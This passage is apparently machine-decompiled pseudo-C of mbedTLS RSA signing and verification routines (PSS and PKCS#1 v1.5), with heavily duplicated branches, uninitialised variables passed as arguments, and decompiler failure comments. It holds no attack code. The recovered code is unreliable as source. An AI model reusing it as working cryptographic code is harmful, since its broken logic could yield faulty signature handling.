                // Detected a possible infinite recursion (goto support failed); quitting...
            }
        }
        // Detected a possible infinite recursion (goto support failed); quitting...
    }
    // Detected a possible infinite recursion (goto support failed); quitting...
}

// Address range: 0x8050280 - 0x80502df
int32_t mbedtls_rsa_rsassa_pss_verify(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    int32_t v1 = g3; // 0x8050283
    g3 = a8;
    int32_t v2 = *(int32_t *)(a1 + 168); // 0x8050290
    int32_t v3 = v2; // 0x80502ae
    if (v2 == 0) {
        // if_80502a8_0_true
        v3 = a5;
        // branch -> after_if_80502a8_0
    }
    // after_if_80502a8_0
    g4 = a6;
    int32_t result = mbedtls_rsa_rsassa_pss_verify_ext((char *)a1, (char *)a2, a3, a4, a5, a6, a7, v3, -1, a8); // 0x80502d5
    g3 = v1;
    return result;
}

// Address range: 0x80502e0 - 0x805039f
int32_t mbedtls_rsa_pkcs1_verify(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    int32_t v1 = g3; // 0x80502ec
    g4 = a5;
    int32_t v2 = g7; // 0x80502f2
    g3 = a6;
    int32_t v3 = g5; // 0x80502fe
    int32_t v4 = *(int32_t *)(a1 + 164); // 0x8050310
    int32_t v5 = a1; // 0x8050386
    int32_t v6 = v4; // 0x8050350
    int32_t v7;
    int32_t v8;
    if (v4 == 0) {
        // 0x805031a
        g5 = v3;
        g7 = v2;
        g3 = v1;
        v5 = mbedtls_rsa_rsassa_pkcs1_v15_verify((char *)v8, (char *)v7, a1, a2, a3, a4, a5, a6);
        v6 = g6;
        // branch -> 0x8050350
    }
    // 0x8050350
    if (v6 != 1) {
        // 0x8050355
        g3 = v1;
        g7 = v2;
        g5 = v3;
        return -0x4100;
    }
    // 0x8050368
    g5 = v3;
    g7 = v2;
    int32_t v9 = g3; // 0x8050377
    g3 = v1;
    return mbedtls_rsa_rsassa_pss_verify(v8, v7, v5, a2, a3, a4, g4, v9);
}

// Address range: 0x80503a0 - 0x805064f
int32_t mbedtls_rsa_rsassa_pkcs1_v15_sign(char * a1, char * a2, int32_t a3, int32_t a4, int32_t a5, char a6, int32_t a7, char * a8) {
    int32_t v1;
    char v2 = v1; // bp-36
    int32_t v3 = a6;
    g4 = v3;
    g7 = a5;
    int32_t v4 = g3; // 0x80503b6
    g5 = (int32_t)a8;
    int32_t v5 = (int32_t)a1;
    int32_t v6; // 0x805048f
    int32_t v7; // 0x805061c
    int32_t v8; // 0x8050478
    int32_t v9; // 0x8050528_0
    int32_t v10; // 0x8050571_5
    int32_t result; // 0x80504bb
    int32_t v11; // 0x80504de
    int32_t v12; // 0x8050501
    char * mem; // 0x8050571
    char * mem2; // 0x805058a
    int32_t v13; // 0x80505c5
    int32_t v14; // 0x80505f9
    int32_t v15; // eax
    int32_t v16; // ebx
    int32_t v17; // edx
    int32_t v18;
    int32_t v19;
    int32_t v20;
    uint32_t v21; // 0x80503e1
    int32_t v22;
    int32_t v23;
    int32_t v24;
    int32_t v25;
    int32_t result2;
    int32_t v26; // 0x805063e
    int32_t v27;
    int32_t v28; // 0x8050408
    int32_t v29; // 0x805045c
    int32_t v30; // 0x805061c
    int32_t v31; // 0x805061f
    int32_t v32; // 0x80503d8
    int32_t v33; // 0x805042e
    int32_t v34; // 0x8050434
    int32_t v35; // 0x80503d5
    int32_t v36; // 0x805040f
    int32_t v37; // 0x805046c
    int32_t v38; // 0x80504b0
    uint32_t v39; // 0x8050609
    char v40; // 0x8050615
    if (a4 != 1) {
        // 0x80503c2
        v2 = 0;
        v19 = 0;
        v35 = *(int32_t *)(v5 + 4);
        v32 = v35 - 3;
        if (a5 == 0) {
            // 0x80503e1
            v21 = v32 - v3;
            g6 = v21;
            if (v21 > v35 || v21 < 8) {
                // 0x80503e7
                // branch -> 0x80503ec
                // 0x80503ec
                g3 = v4;
                return -0x4080;
            }
            // 0x8050405
            *(char *)g5 = 0;
            v28 = g5;
            g3 = v28 + 2;
            *(char *)(v28 + 1) = 1;
            v36 = g6;
            memset((char *)g3, 255, v36);
            v33 = g3 + v36;
            v17 = v33;
            *(char *)v33 = 0;
            v34 = v17 + 1;
            v22 = 0x1000000 * g4 / 0x1000000;
            g4 = v22;
            if (g7 == 0) {
                // 0x8050530
                memcpy((char *)v34, (char *)a7, v22);
                // branch -> 0x80504a2
            } else {
                // 0x8050440
                *(char *)v34 = 48;
                v15 = v2;
                *(char *)(v17 + 3) = 48;
                *(char *)(v17 + 5) = 6;
                *(char *)(v17 + 2) = (char)(v15 + 8 + g4);
                *(char *)(v17 + 4) = (char)(v15 + 4);
                v29 = v17;
                v16 = v29 + 7;
                *(char *)(v29 + 6) = (char)v15;
                v37 = g4;
                memcpy((char *)v16, (char *)v19, v15);
                v8 = (int32_t)v2 + v16;
                v16 = v8;
                *(char *)v8 = 5;
                *(char *)(v16 + 1) = 0;
                *(char *)(v16 + 2) = 4;
                g4 = v37;
                *(char *)(v16 + 3) = (char)v37;
                v6 = v16 + 4;
                g3 = v6;
                memcpy((char *)v6, (char *)a7, g4);
                // branch -> 0x80504a2
            }
            // 0x80504a2
            v23 = (int32_t)a1;
            if (a4 == 0) {
                // 0x80504ad
                v38 = g5;
                result = mbedtls_rsa_public(v23, v38, v38);
                g3 = v4;
                return result;
            }
            // 0x8050560
            mem = calloc(1, *(int32_t *)(v23 + 4));
            v10 = (int32_t)mem;
            v25 = (int32_t)a1;
            g6 = v25;
            mem2 = calloc(1, *(int32_t *)(v25 + 4));
            g7 = (int32_t)mem2;
            if (mem2 != NULL) {
                // 0x805059f
                if (mem != NULL) {
                    // 0x80505a6
                    v13 = mbedtls_rsa_private((int32_t)a1, (int32_t)a2, a3, g5, v10);
                    g3 = v13;
                    if (v13 == 0) {
                        // 0x80505e8
                        v14 = mbedtls_rsa_public((int32_t)a1, v10, g7);
                        g3 = v14;
                        if (v14 == 0) {
                            // 0x8050604
                            g4 = 0;
                            v39 = *(int32_t *)((int32_t)a1 + 4);
                            if (v39 == 0) {
                                // 0x8050626
                                v26 = g5;
                                // branch -> 0x8050638
                            } else {
                                // 0x8050613
                                v27 = g5;
                                v30 = 0;
                                v40 = *(char *)(v30 + v27);
                                v7 = v30 + 1;
                                v31 = (int32_t)(*(char *)(v30 + g7) ^ v40);
                                g4 = v31;
                                // branch -> 0x8050615
                                while (v7 < v39) {
                                    // 0x8050615
                                    v30 = v7;
                                    v40 = *(char *)(v30 + v27);
                                    v7 = v30 + 1;
                                    v31 |= (int32_t)(*(char *)(v30 + g7) ^ v40);
                                    g4 = v31;
                                    // continue -> 0x8050615
                                }
                                // 0x8050626
                                if (v31 % 256 != 0) {
                                    // 0x8050631
                                    g3 = -0x4300;
                                    // branch -> 0x80505d0
                                    // 0x80505d0
                                    g6 = v10;
                                    free(mem);
                                    free((char *)g7);
                                    result2 = g3;
                                    // branch -> 0x80503ec
                                    // 0x80503ec
                                    g3 = v4;
                                    return result2;
                                }
                                v26 = v27;
                            }
                            // 0x8050638
                            memcpy((char *)v26, mem, v39);
                            // branch -> 0x80505d0
                        }
                    }
                    // 0x80505d0
                    g6 = v10;
                    free(mem);
                    free((char *)g7);
                    result2 = g3;
                    // branch -> 0x80503ec
                    // 0x80503ec
                    g3 = v4;
                    return result2;
                }
            }
            // 0x8050595
            // branch -> 0x80503ec
            // 0x80503ec
            g3 = v4;
            return -16;
        }
        // 0x80504d8
        v11 = mbedtls_md_info_from_type(a5);
        g4 = v11;
        if (v11 != 0) {
            // 0x80504ed
            v12 = mbedtls_oid_get_oid_by_md(g7, &v19, (int32_t *)&v2, v20);
            g6 = v32;
            v24 = 0x1000000 * v11 / 0x1000000;
            g4 = v24;
            if (v12 == 0) {
                // 0x8050514
                mbedtls_md_get_size(v24);
                v9 = &v18;
                g4 = v9;
                // branch -> 0x80503e1
                // 0x80503e1
                v21 = v32 - (int32_t)v2 - 10 - v9;
                g6 = v21;
                if (v21 > v35 || v21 < 8) {
                    // 0x80503e7
                    // branch -> 0x80503ec
                    // 0x80503ec
                    g3 = v4;
                    return -0x4080;
                }
                // 0x8050405
                *(char *)g5 = 0;
                v28 = g5;
                g3 = v28 + 2;
                *(char *)(v28 + 1) = 1;
                v36 = g6;
                memset((char *)g3, 255, v36);
                v33 = g3 + v36;
                v17 = v33;
                *(char *)v33 = 0;
                v34 = v17 + 1;
                v22 = 0x1000000 * g4 / 0x1000000;
                g4 = v22;
                if (g7 == 0) {
                    // 0x8050530
                    memcpy((char *)v34, (char *)a7, v22);
                    // branch -> 0x80504a2
                } else {
                    // 0x8050440
                    *(char *)v34 = 48;
                    v15 = v2;
                    *(char *)(v17 + 3) = 48;
                    *(char *)(v17 + 5) = 6;
                    *(char *)(v17 + 2) = (char)(v15 + 8 + g4);
                    *(char *)(v17 + 4) = (char)(v15 + 4);
                    v29 = v17;
                    v16 = v29 + 7;
                    *(char *)(v29 + 6) = (char)v15;
                    v37 = g4;
                    memcpy((char *)v16, (char *)v19, v15);
                    v8 = (int32_t)v2 + v16;
                    v16 = v8;
                    *(char *)v8 = 5;
                    *(char *)(v16 + 1) = 0;
                    *(char *)(v16 + 2) = 4;
                    g4 = v37;
                    *(char *)(v16 + 3) = (char)v37;
                    v6 = v16 + 4;
                    g3 = v6;
                    memcpy((char *)v6, (char *)a7, g4);
                    // branch -> 0x80504a2
                }
                // 0x80504a2
                v23 = (int32_t)a1;
                if (a4 == 0) {
                    // 0x80504ad
                    v38 = g5;
                    result = mbedtls_rsa_public(v23, v38, v38);
                    g3 = v4;
                    return result;
                }
                // 0x8050560
                mem = calloc(1, *(int32_t *)(v23 + 4));
                v10 = (int32_t)mem;
                v25 = (int32_t)a1;
                g6 = v25;
                mem2 = calloc(1, *(int32_t *)(v25 + 4));
                g7 = (int32_t)mem2;
                if (mem2 != NULL) {
                    // 0x805059f
                    if (mem != NULL) {
                        // 0x80505a6
                        v13 = mbedtls_rsa_private((int32_t)a1, (int32_t)a2, a3, g5, v10);
                        g3 = v13;
                        if (v13 == 0) {
                            // 0x80505e8
                            v14 = mbedtls_rsa_public((int32_t)a1, v10, g7);
                            g3 = v14;
                            if (v14 == 0) {
                                // 0x8050604
                                g4 = 0;
                                v39 = *(int32_t *)((int32_t)a1 + 4);
                                if (v39 == 0) {
                                    // 0x8050626
                                    v26 = g5;
                                    // branch -> 0x8050638
                                } else {
                                    // 0x8050613
                                    v27 = g5;
                                    v30 = 0;
                                    v40 = *(char *)(v30 + v27);
                                    v7 = v30 + 1;
                                    v31 = (int32_t)(*(char *)(v30 + g7) ^ v40);
                                    g4 = v31;
                                    // branch -> 0x8050615
                                    while (v7 < v39) {
                                        // 0x8050615
                                        v30 = v7;
                                        v40 = *(char *)(v30 + v27);
                                        v7 = v30 + 1;
                                        v31 |= (int32_t)(*(char *)(v30 + g7) ^ v40);
                                        g4 = v31;
                                        // continue -> 0x8050615
                                    }
                                    // 0x8050626
                                    if (v31 % 256 != 0) {
                                        // 0x8050631
                                        g3 = -0x4300;
                                        // branch -> 0x80505d0
                                        // 0x80505d0
                                        g6 = v10;
                                        free(mem);
                                        free((char *)g7);
                                        result2 = g3;
                                        // branch -> 0x80503ec
                                        // 0x80503ec
                                        g3 = v4;
                                        return result2;
                                    }
                                    v26 = v27;
                                }
                                // 0x8050638
                                memcpy((char *)v26, mem, v39);
                                // branch -> 0x80505d0
                            }
                        }
                        // 0x80505d0
                        g6 = v10;
                        free(mem);
                        free((char *)g7);
                        result2 = g3;
                        // branch -> 0x80503ec
                        // 0x80503ec
                        g3 = v4;
                        return result2;
                    }
                }
                // 0x8050595
                // branch -> 0x80503ec
                // 0x80503ec
                g3 = v4;
                return -16;
            }
        }
        // 0x80503e7
        // branch -> 0x80503ec
        // 0x80503ec
        g3 = v4;
        return -0x4080;
    }
    // 0x8050548
    if (*(int32_t *)(v5 + 164) != 0) {
        // 0x80503e7
        // branch -> 0x80503ec
        // 0x80503ec
        g3 = v4;
        return -0x4080;
    }
    // 0x80503c2
    v2 = 0;
    v19 = 0;
    v35 = *(int32_t *)(v5 + 4);
    v32 = v35 - 3;
    if (a5 == 0) {
        // 0x80503e1
        v21 = v32 - v3;
        g6 = v21;
        if (v21 <= v35) {
            // 0x8050400
            if (v21 >= 8) {
                // 0x8050405
                *(char *)g5 = 0;
                v28 = g5;
                g3 = v28 + 2;
                *(char *)(v28 + 1) = 1;
                v36 = g6;
                memset((char *)g3, 255, v36);
                v33 = g3 + v36;
                v17 = v33;
                *(char *)v33 = 0;
                v34 = v17 + 1;
                v22 = 0x1000000 * g4 / 0x1000000;
                g4 = v22;
                if (g7 == 0) {
                    // 0x8050530
                    memcpy((char *)v34, (char *)a7, v22);
                    // branch -> 0x80504a2
                } else {
                    // 0x8050440
                    *(char *)v34 = 48;
                    v15 = v2;
                    *(char *)(v17 + 3) = 48;
                    *(char *)(v17 + 5) = 6;
                    *(char *)(v17 + 2) = (char)(v15 + 8 + g4);
                    *(char *)(v17 + 4) = (char)(v15 + 4);
                    v29 = v17;
                    v16 = v29 + 7;
                    *(char *)(v29 + 6) = (char)v15;
                    v37 = g4;
                    memcpy((char *)v16, (char *)v19, v15);
                    v8 = (int32_t)v2 + v16;
                    v16 = v8;
                    *(char *)v8 = 5;
                    *(char *)(v16 + 1) = 0;
                    *(char *)(v16 + 2) = 4;
                    g4 = v37;
                    *(char *)(v16 + 3) = (char)v37;
                    v6 = v16 + 4;
                    g3 = v6;
                    memcpy((char *)v6, (char *)a7, g4);
                    // branch -> 0x80504a2
                }
                // 0x80504a2
                v23 = (int32_t)a1;
                if (a4 == 0) {
                    // 0x80504ad
                    v38 = g5;
                    result = mbedtls_rsa_public(v23, v38, v38);
                    g3 = v4;
                    return result;
                }
                // 0x8050560
                mem = calloc(1, *(int32_t *)(v23 + 4));
                v10 = (int32_t)mem;
                v25 = (int32_t)a1;
                g6 = v25;
                mem2 = calloc(1, *(int32_t *)(v25 + 4));
                g7 = (int32_t)mem2;
                if (mem2 != NULL) {
                    // 0x805059f
                    if (mem != NULL) {
                        // 0x80505a6
                        v13 = mbedtls_rsa_private((int32_t)a1, (int32_t)a2, a3, g5, v10);
                        g3 = v13;
                        if (v13 == 0) {
                            // 0x80505e8
                            v14 = mbedtls_rsa_public((int32_t)a1, v10, g7);
                            g3 = v14;
                            if (v14 == 0) {
                                // 0x8050604
                                g4 = 0;
                                v39 = *(int32_t *)((int32_t)a1 + 4);
                                if (v39 == 0) {
                                    // 0x8050626
                                    v26 = g5;
                                    // branch -> 0x8050638
                                } else {
                                    // 0x8050613
                                    v27 = g5;
                                    v30 = 0;
                                    v40 = *(char *)(v30 + v27);
                                    v7 = v30 + 1;
                                    v31 = (int32_t)(*(char *)(v30 + g7) ^ v40);
                                    g4 = v31;
                                    // branch -> 0x8050615
                                    while (v7 < v39) {
                                        // 0x8050615
                                        v30 = v7;
                                        v40 = *(char *)(v30 + v27);
                                        v7 = v30 + 1;
                                        v31 |= (int32_t)(*(char *)(v30 + g7) ^ v40);
                                        g4 = v31;
                                        // continue -> 0x8050615
                                    }
                                    // 0x8050626
                                    if (v31 % 256 != 0) {
                                        // 0x8050631
                                        g3 = -0x4300;
                                        // branch -> 0x80505d0
                                        // 0x80505d0
                                        g6 = v10;
                                        free(mem);
                                        free((char *)g7);
                                        result2 = g3;
                                        // branch -> 0x80503ec
                                        // 0x80503ec
                                        g3 = v4;
                                        return result2;
                                    }
                                    v26 = v27;
                                }
                                // 0x8050638
                                memcpy((char *)v26, mem, v39);
                                // branch -> 0x80505d0
                            }
                        }
                        // 0x80505d0
                        g6 = v10;
                        free(mem);
                        free((char *)g7);
                        result2 = g3;
                        // branch -> 0x80503ec
                        // 0x80503ec
                        g3 = v4;
                        return result2;
                    }
                }
                // 0x8050595
                // branch -> 0x80503ec
                // 0x80503ec
                g3 = v4;
                return -16;
            }
        }
    } else {
        // 0x80504d8
        v11 = mbedtls_md_info_from_type(a5);
        g4 = v11;
        if (v11 != 0) {
            // 0x80504ed
            v12 = mbedtls_oid_get_oid_by_md(g7, &v19, (int32_t *)&v2, v20);
            g6 = v32;
            v24 = 0x1000000 * v11 / 0x1000000;
            g4 = v24;
            if (v12 == 0) {
                // 0x8050514
                mbedtls_md_get_size(v24);
                v9 = &v18;
                g4 = v9;
                // branch -> 0x80503e1
                // 0x80503e1
                v21 = v32 - (int32_t)v2 - 10 - v9;
                g6 = v21;
                if (v21 <= v35) {
                    // 0x8050400
                    if (v21 >= 8) {
                        // 0x8050405
                        *(char *)g5 = 0;
                        v28 = g5;
                        g3 = v28 + 2;
                        *(char *)(v28 + 1) = 1;
                        v36 = g6;
                        memset((char *)g3, 255, v36);
                        v33 = g3 + v36;
                        v17 = v33;
                        *(char *)v33 = 0;
                        v34 = v17 + 1;
                        v22 = 0x1000000 * g4 / 0x1000000;
                        g4 = v22;
                        if (g7 == 0) {
                            // 0x8050530
                            memcpy((char *)v34, (char *)a7, v22);
                            // branch -> 0x80504a2
                        } else {
                            // 0x8050440
                            *(char *)v34 = 48;
                            v15 = v2;
                            *(char *)(v17 + 3) = 48;
                            *(char *)(v17 + 5) = 6;
                            *(char *)(v17 + 2) = (char)(v15 + 8 + g4);
                            *(char *)(v17 + 4) = (char)(v15 + 4);
                            v29 = v17;
                            v16 = v29 + 7;
                            *(char *)(v29 + 6) = (char)v15;
                            v37 = g4;
                            memcpy((char *)v16, (char *)v19, v15);
                            v8 = (int32_t)v2 + v16;
                            v16 = v8;
                            *(char *)v8 = 5;
                            *(char *)(v16 + 1) = 0;
                            *(char *)(v16 + 2) = 4;
                            g4 = v37;
                            *(char *)(v16 + 3) = (char)v37;
                            v6 = v16 + 4;
                            g3 = v6;
                            memcpy((char *)v6, (char *)a7, g4);
                            // branch -> 0x80504a2
                        }
                        // 0x80504a2
                        v23 = (int32_t)a1;
                        if (a4 == 0) {
                            // 0x80504ad
                            v38 = g5;
                            result = mbedtls_rsa_public(v23, v38, v38);
                            g3 = v4;
                            return result;
                        }
                        // 0x8050560
                        mem = calloc(1, *(int32_t *)(v23 + 4));
                        v10 = (int32_t)mem;
                        v25 = (int32_t)a1;
                        g6 = v25;
                        mem2 = calloc(1, *(int32_t *)(v25 + 4));
                        g7 = (int32_t)mem2;
                        if (mem2 != NULL) {
                            // 0x805059f
                            if (mem != NULL) {
                                // 0x80505a6
                                v13 = mbedtls_rsa_private((int32_t)a1, (int32_t)a2, a3, g5, v10);
                                g3 = v13;
                                if (v13 == 0) {
                                    // 0x80505e8
                                    v14 = mbedtls_rsa_public((int32_t)a1, v10, g7);
                                    g3 = v14;
                                    if (v14 == 0) {
                                        // 0x8050604
                                        g4 = 0;
                                        v39 = *(int32_t *)((int32_t)a1 + 4);
                                        if (v39 == 0) {
                                            // 0x8050626
                                            v26 = g5;
                                            // branch -> 0x8050638
                                        } else {
                                            // 0x8050613
                                            v27 = g5;
                                            v30 = 0;
                                            v40 = *(char *)(v30 + v27);
                                            v7 = v30 + 1;
                                            v31 = (int32_t)(*(char *)(v30 + g7) ^ v40);
                                            g4 = v31;
                                            // branch -> 0x8050615
                                            while (v7 < v39) {
                                                // 0x8050615
                                                v30 = v7;
                                                v40 = *(char *)(v30 + v27);
                                                v7 = v30 + 1;
                                                v31 |= (int32_t)(*(char *)(v30 + g7) ^ v40);
                                                g4 = v31;
                                                // continue -> 0x8050615
                                            }
                                            // 0x8050626
                                            if (v31 % 256 != 0) {
                                                // 0x8050631
                                                g3 = -0x4300;
                                                // branch -> 0x80505d0
                                                // 0x80505d0
                                                g6 = v10;
                                                free(mem);
                                                free((char *)g7);
                                                result2 = g3;
                                                // branch -> 0x80503ec
                                                // 0x80503ec
                                                g3 = v4;
                                                return result2;
                                            }
                                            v26 = v27;
                                        }
                                        // 0x8050638
                                        memcpy((char *)v26, mem, v39);
                                        // branch -> 0x80505d0
                                    }
                                }
                                // 0x80505d0
                                g6 = v10;
                                free(mem);
                                free((char *)g7);
                                result2 = g3;
                                // branch -> 0x80503ec
                                // 0x80503ec
                                g3 = v4;
                                return result2;
                            }
                        }
                        // 0x8050595
                        // branch -> 0x80503ec
                        // 0x80503ec
                        g3 = v4;
                        return -16;
                    }
                }
            }
        }
    }
    // 0x80503e7
    // branch -> 0x80503ec
    // 0x80503ec
    g3 = v4;
    return -0x4080;
}

// Address range: 0x8050650 - 0x80508ef
void mbedtls_rsa_rsassa_pss_sign(char * a1, char * a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, char * a8) {
    g7 = a4;
    int32_t v1 = g3; // 0x805065f
    int32_t v2 = g5; // 0x8050665
    int32_t v3 = (int32_t)a1;
    g3 = v3;
    g5 = (int32_t)a2;
    int32_t v4; // 0x8050786
    int32_t v5; // 0x80506dd
    int32_t v6; // 0x805077d
    int32_t v7; // 0x80507a8
    int32_t v8; // 0x8050711_0
    int32_t v9; // 0x80507a5_0
    int32_t v10; // 0x8050688
    int32_t v11; // 0x80506c1
    int32_t v12; // 0x8050767
    int32_t v13; // 0x80506b0
    uint32_t v14; // 0x80506d8
    uint32_t v15; // 0x8050894
    int32_t v16;
    int32_t v17;
    int32_t v18;
    int32_t v19;
    int32_t v20;
    int32_t v21; // 0x805072c
    uint32_t v22; // 0x80506e2
    int32_t v23; // 0x8050752
    int32_t v24; // 0x8050899
    uint32_t v25; // 0x805067b
    int32_t v26; // 0x80508a9
    if (a4 == 1) {
        // 0x8050740
        if (*(int32_t *)(v3 + 164) != 1 || a2 == NULL) {
            // 0x8050691
            g1 = -0x4080;
            // branch -> 0x8050696
            // 0x8050696
            g3 = v1;
            g5 = v2;
            return;
        }
        // 0x805067b
        v25 = *(int32_t *)(v3 + 4);
        if (a5 == 0) {
            // 0x80506b8
            v11 = mbedtls_md_info_from_type(*(int32_t *)(v3 + 168));
            if (v11 != 0) {
                // 0x80506ca
                v14 = mbedtls_md_get_size(v11) % 256;
                v5 = 2 * v14;
                g4 = v5;
                v22 = v5 + 2;
                g237 = v25 == v22;
                if (v25 >= v22) {
                    // 0x80506ea
                    v20 = (int32_t)a8;
                    memset(a8, 0, v25);
                    v8 = &v16;
                    g1 = a3;
                    ((int32_t (*)(int32_t, int32_t, int32_t))g5)(a3, v8, v14);
                    v21 = g1;
                    if (v21 != 0) {
                        // 0x8050730
                        g1 = v21 - 0x4480;
                        // branch -> 0x8050696
                        // 0x8050696
                        g3 = v1;
                        g5 = v2;
                        return;
                    }
                    // 0x8050752
                    v23 = g3 + 8;
                    v12 = mbedtls_mpi_bitlen(v23, v8);
                    v6 = v20 - 2 + v25 - v5;
                    *(char *)v6 = 1;
                    v4 = v6 + 1;
                    memcpy((char *)v4, (char *)&v16, v14);
                    v9 = &v19;
                    g4 = v9;
                    v7 = v4 + v14;
                    mbedtls_md_init(&v19);
                    g6 = v11;
                    g1 = v9;
                    mbedtls_md_setup(&v19, v11, 0);
                    mbedtls_md_starts(&v19);
                    mbedtls_md_update(&v19, v7, 8);
                    mbedtls_md_update(&v19, a7, a6);
                    mbedtls_md_update(&v19, v8, v14);
                    mbedtls_md_finish(&v19, v7);
                    g4 = v7;
                    g6 = v25 - 1 - v14 + (int32_t)((v12 + 7) % 8 == 0);
                    g1 = (int32_t)((v12 + 7) % 8 == 0) + v20;
                    mgf_mask(v14, &v19, v14, v18, v17);
                    g1 = v9;
                    mbedtls_md_free((char *)&v19);
                    v15 = ((8 * v25 | 1) - mbedtls_mpi_bitlen(v23, v9)) % 32;
                    v24 = 255;
                    if (v15 != 0) {
                        // if_8050894_0_true
                        v24 = 255 >> v15;
                        // branch -> after_if_8050894_0
                    }
                    // after_if_8050894_0
                    *a8 = (char)((int32_t)*a8 & v24);
                    *(char *)(v4 + 2 * v14) = -68;
                    if (g7 == 0) {
                        // 0x80508a9
                        v26 = v20;
                        g1 = mbedtls_rsa_public(g3, v26, v26);
                        // branch -> 0x8050696
                    } else {
                        // 0x80508be
                        g1 = mbedtls_rsa_private(g3, g5, a3, v20, v20);
                        // branch -> 0x8050696
                    }
                    // 0x8050696
                    g3 = v1;
                    g5 = v2;
                    return;
                }
            }
        } else {
            // 0x8050685
            v10 = mbedtls_md_info_from_type(a5);
            if (v10 != 0) {
                // 0x80506a8
                v13 = mbedtls_md_get_size(v10) % 256;
                // branch -> 0x80506b8
                // 0x80506b8
                v11 = mbedtls_md_info_from_type(*(int32_t *)(g3 + 168));
                if (v11 != 0) {
                    // 0x80506ca
                    v14 = mbedtls_md_get_size(v11) % 256;
                    v5 = 2 * v14;
                    g4 = v5;
                    v22 = v5 + 2;
                    g237 = v25 == v22;
                    if (v25 >= v22) {
                        // 0x80506ea
                        v20 = (int32_t)a8;
                        memset(a8, 0, v25);
                        v8 = &v16;
                        g1 = a3;
                        ((int32_t (*)(int32_t, int32_t, int32_t))g5)(a3, v8, v14);
                        v21 = g1;
                        if (v21 != 0) {
                            // 0x8050730
                            g1 = v21 - 0x4480;
                            // branch -> 0x8050696
                            // 0x8050696
                            g3 = v1;
                            g5 = v2;
                            return;
                        }
                        // 0x8050752
                        v23 = g3 + 8;
                        v12 = mbedtls_mpi_bitlen(v23, v8);
                        v6 = v20 - 2 + v25 - v5;
                        *(char *)v6 = 1;
                        v4 = v6 + 1;
                        memcpy((char *)v4, (char *)&v16, v14);
                        v9 = &v19;
                        g4 = v9;
                        v7 = v4 + v14;
                        mbedtls_md_init(&v19);
                        g6 = v11;
                        g1 = v9;
                        mbedtls_md_setup(&v19, v11, 0);
                        mbedtls_md_starts(&v19);
                        mbedtls_md_update(&v19, v7, 8);
                        mbedtls_md_update(&v19, a7, v13);
                        mbedtls_md_update(&v19, v8, v14);
                        mbedtls_md_finish(&v19, v7);
                        g4 = v7;
                        g6 = v25 - 1 - v14 + (int32_t)((v12 + 7) % 8 == 0);
                        g1 = (int32_t)((v12 + 7) % 8 == 0) + v20;
                        mgf_mask(v14, &v19, v14, v18, v17);
                        g1 = v9;
                        mbedtls_md_free((char *)&v19);
                        v15 = ((8 * v25 | 1) - mbedtls_mpi_bitlen(v23, v9)) % 32;
                        v24 = 255;
                        if (v15 != 0) {
                            // if_8050894_0_true
                            v24 = 255 >> v15;
                            // branch -> after_if_8050894_0
                        }
                        // after_if_8050894_0
                        *a8 = (char)((int32_t)*a8 & v24);
                        *(char *)(v4 + 2 * v14) = -68;
                        if (g7 == 0) {
                            // 0x80508a9
                            v26 = v20;
                            g1 = mbedtls_rsa_public(g3, v26, v26);
                            // branch -> 0x8050696
                        } else {
                            // 0x80508be
                            g1 = mbedtls_rsa_private(g3, g5, a3, v20, v20);
                            // branch -> 0x8050696
                        }
                        // 0x8050696
                        g3 = v1;
                        g5 = v2;
                        return;
                    }
                }
            }
        }
        // 0x8050691
        g1 = -0x4080;
        // branch -> 0x8050696
        // 0x8050696
        g3 = v1;
        g5 = v2;
        return;
    }
    // 0x8050677
    if (a2 == NULL) {
        // 0x8050691
        g1 = -0x4080;
        // branch -> 0x8050696
        // 0x8050696
        g3 = v1;
        g5 = v2;
        return;
    }
    // 0x805067b
    v25 = *(int32_t *)(v3 + 4);
    if (a5 == 0) {
        // 0x80506b8
        v11 = mbedtls_md_info_from_type(*(int32_t *)(v3 + 168));
        if (v11 != 0) {
            // 0x80506ca
            v14 = mbedtls_md_get_size(v11) % 256;
            v5 = 2 * v14;
            g4 = v5;
            v22 = v5 + 2;
            g237 = v25 == v22;
            if (v25 >= v22) {
                // 0x80506ea
                v20 = (int32_t)a8;
                memset(a8, 0, v25);
                v8 = &v16;
                g1 = a3;
                ((int32_t (*)(int32_t, int32_t, int32_t))g5)(a3, v8, v14);
                v21 = g1;
                if (v21 != 0) {
                    // 0x8050730
                    g1 = v21 - 0x4480;
                    // branch -> 0x8050696
                    // 0x8050696
                    g3 = v1;
                    g5 = v2;
                    return;
                }
                // 0x8050752
                v23 = g3 + 8;
                v12 = mbedtls_mpi_bitlen(v23, v8);
                v6 = v20 - 2 + v25 - v5;
                *(char *)v6 = 1;
                v4 = v6 + 1;
                memcpy((char *)v4, (char *)&v16, v14);
                v9 = &v19;
                g4 = v9;
                v7 = v4 + v14;
                mbedtls_md_init(&v19);
                g6 = v11;
                g1 = v9;
                mbedtls_md_setup(&v19, v11, 0);
                mbedtls_md_starts(&v19);
                mbedtls_md_update(&v19, v7, 8);
                mbedtls_md_update(&v19, a7, a6);
                mbedtls_md_update(&v19, v8, v14);
                mbedtls_md_finish(&v19, v7);
                g4 = v7;
                g6 = v25 - 1 - v14 + (int32_t)((v12 + 7) % 8 == 0);
                g1 = (int32_t)((v12 + 7) % 8 == 0) + v20;
                mgf_mask(v14, &v19, v14, v18, v17);
                g1 = v9;
                mbedtls_md_free((char *)&v19);
                v15 = ((8 * v25 | 1) - mbedtls_mpi_bitlen(v23, v9)) % 32;
                v24 = 255;
                if (v15 != 0) {
                    // if_8050894_0_true
                    v24 = 255 >> v15;
                    // branch -> after_if_8050894_0
                }
                // after_if_8050894_0
                *a8 = (char)((int32_t)*a8 & v24);
                *(char *)(v4 + 2 * v14) = -68;
                if (g7 == 0) {
                    // 0x80508a9
                    v26 = v20;
                    g1 = mbedtls_rsa_public(g3, v26, v26);
                    // branch -> 0x8050696
                } else {
                    // 0x80508be
                    g1 = mbedtls_rsa_private(g3, g5, a3, v20, v20);
                    // branch -> 0x8050696
                }
                // 0x8050696
                g3 = v1;
                g5 = v2;
                return;
            }
        }
    } else {
        // 0x8050685
        v10 = mbedtls_md_info_from_type(a5);
        if (v10 != 0) {
            // 0x80506a8
            v13 = mbedtls_md_get_size(v10) % 256;
            // branch -> 0x80506b8
            // 0x80506b8
            v11 = mbedtls_md_info_from_type(*(int32_t *)(g3 + 168));
            if (v11 != 0) {
                // 0x80506ca
